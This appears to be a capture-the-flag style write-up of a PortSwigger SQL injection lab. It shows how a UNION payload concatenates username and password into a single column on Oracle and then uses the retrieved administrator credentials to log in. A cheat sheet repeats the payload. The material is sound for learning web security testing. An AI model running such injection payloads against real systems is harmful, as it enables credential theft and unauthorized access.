# SQL Injection UNION Attack — Retrieving Multiple Values in a Single Column


**Lab:** SQL injection UNION attack, retrieving multiple values in a single column

**Difficulty:** Practitioner

**Status:** Solved ✅



## 🎯 Goal



Retrieve both `username` and `password` from the `users` table when only **one of the available columns can be used 
to display the required data**.



---



## 1. Determine the Number of Columns



The original query returned:



```text


2 columns

```


Therefore, the `UNION SELECT` must also return **2 columns**.


---


## 2. Combine Multiple Values into One Column


The database contains:


```text

users

├── username

└── password

```



We need to display both values together.



For Oracle, the **string concatenation operator** is:



```sql

||

```



We can use a separator such as:



```text

~

```



to make the two values easy to distinguish.



Payload:



```sql

' UNION SELECT NULL,username || '~' || password FROM users--

```


### Structure


```text

Column 1              Column 2

   NULL          username + ~ + password

                    ↑

              combined values

```



---



## 3. Result



The response returned:


```text

administrator~qffbiknduxnllgv8oeds

```



Therefore:


```text

Username: administrator

Password: qffbiknduxnllgv8oeds

```


Using these credentials to log in as `administrator` solved the lab. ✅

---


## 🧠 Key Concept


When the required values cannot be returned in separate columns, we can **concatenate multiple values into a single 

column**.

For Oracle:


```sql

value1 || separator || value2

```


Example:



```sql

username || '~' || password

```



Result:



```text

username~password

```



---



## 🔑 Cheat Sheet



```sql

-- Oracle string concatenation

username || password



-- With a separator

username || '~' || password



-- UNION with 2 columns

' UNION SELECT NULL,username || '~' || password FROM users--

```



### Attack Flow



```text


SQL Injection

     ↓

Determine columns

     ↓

2 columns

     ↓

Concatenate username + password

     ↓

username || '~' || password

     ↓

Retrieve administrator credentials

     ↓

Login

     ↓

LAB SOLVED 🎯

```


[PortSwigger — SQL injection UNION attacks](https://portswigger.net/web-security/sql-injection/union-attacks?utm_source=chatgpt.com)
